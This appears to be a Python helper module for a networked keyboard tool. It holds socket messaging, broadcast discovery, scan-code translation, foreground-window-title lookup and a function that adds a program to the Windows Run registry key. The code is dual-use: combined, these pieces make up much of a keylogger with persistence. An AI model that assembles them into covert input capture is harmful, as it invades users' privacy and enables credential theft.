import winreg
import os
from os import path
from threading import Thread
import socket
import struct
from collections import OrderedDict
import keyboard
import sys
import netifaces

if os.name == 'nt':
    import win32api
    import win32gui
    from ctypes import windll, create_unicode_buffer
    user32 = windll.user32
elif os.name == 'posix':
    from subprocess import check_output

def broadcast_addresses():
    bd_list = []
    for interface in netifaces.interfaces():
        for link in netifaces.ifaddresses(interface)[netifaces.AF_INET]:
            if link['broadcast'] != "127.255.255.255":
                bd_list.append(link['broadcast'])
    return bd_list

class Event:
    """
    Object styled dictionary for clearer code
    """

    def __init__(self, **entries): self.__dict__.update(entries)

    def __eq__(self, other): return self.__dict__ == other.__dict__

    def __neq__(self, other): return self.__dict__ != other.__dict__


def resource_path(relative_path):
    if getattr(sys, 'frozen', False):
        return path.join(sys._MEIPASS, relative_path)
    return path.join(path.abspath("."), relative_path)

def set_keepalive(sock):
    """
    Toggle on the keepalibe flag of input socket

    Args:
        sock: input socket to alter
    """
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)


def send_msg(sock, msg):
    """
    Sends a message padded with its size

    Args:
        msg: message to send
    """
    msg = msg.encode("utf-8")
    sock.sendall(struct.pack('!I', len(msg)) + msg)


def recv_msg(sock):
    """
    Reciebes a message that's padded with its size

    Returns:
        The sent message
    """
    raw_msglen = recvall(sock, struct.calcsize('!I'))
    if not raw_msglen:
        return None
    msglen = struct.unpack('!I', raw_msglen)[0]
    return recvall(sock, msglen).decode("utf-8")


def recvall(sock, n):
    """
    Reciebes n bytes from the connection

    Args:
        n: number of bytes to read
    """
    data = b''
    while len(data) < n:
        packet = sock.recv(n - len(data))
        if not packet:
            return None
        data += packet
    return data


def SC_to_unicode(sc):
    """
    Translates the key scan code into a unicode character using the user's current keyboard locale

    Args:
        sc: the input scan code

    Returns:
        Unicode localed representation of the scan code
    """

    if os.name == "nt":
        def _ToUnicode(results):
            b = create_unicode_buffer(1)
            if user32.ToUnicode(win32api.MapVirtualKey(sc, 3), sc, win32api.GetKeyboardState(), b, 1, 0) == 1:
                results[0] = b.value
        results = [""]
        t = Thread(target=_ToUnicode, args=(results,))
        t.start()
        t.join()
        return results[0]
    elif os.name == "posix":
        return ""


def get_modifiers():
    """
    Gets actibe keyboard modifier keys

    Returns:
        A dictionary containing the states of CTRL, SHIFT and ALT
    """
    ctrl_pressed = keyboard.is_pressed("ctrl")
    alt_pressed = keyboard.is_pressed("alt")
    shift_pressed = keyboard.is_pressed("shift")
    return OrderedDict([("ctrl", ctrl_pressed), ("shift", shift_pressed), ("alt", alt_pressed)])


def is_modifier(key):
    """
    Returns True if `key` is a name of a modifier key

    Args:
        key: name of the key

    Returns:
        True if `key` is a name of a modifier key
    """
    return key[key.find(" ")+1:] in keyboard.all_modifiers  # ignore side


def get_foreground_window_title():
    """
    Returns the title of the foreground window

    Returns:
        title of the foreground / active window
    """
    if os.name == "nt":
        hwnd = win32gui.GetForegroundWindow()
        length = user32.GetWindowTextLengthW(hwnd)
        buff = create_unicode_buffer(length + 1)
        user32.GetWindowTextW(hwnd, buff, length + 1)
        return buff.value
    elif os.name == "posix":
        return check_output("xprop -id $(xprop -root _NET_ACTIVE_WINDOW | cut -d ' ' -f 5) WM_NAME | cut -d '\"' -f 2", shell=True)


def register_startup(name, path):
    """
    Registers a program to run on startup

    Args:
        name: the giben name to the startup object
        path: path to the file to startup
    """
    if os.name == "nt":
        winreg.SetValueEx(winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run', 0,
                                         winreg.KEY_ALL_ACCESS), name, 1, winreg.REG_SZ, '"{}"'.format(path))
    elif os.name == "posix":
        pass
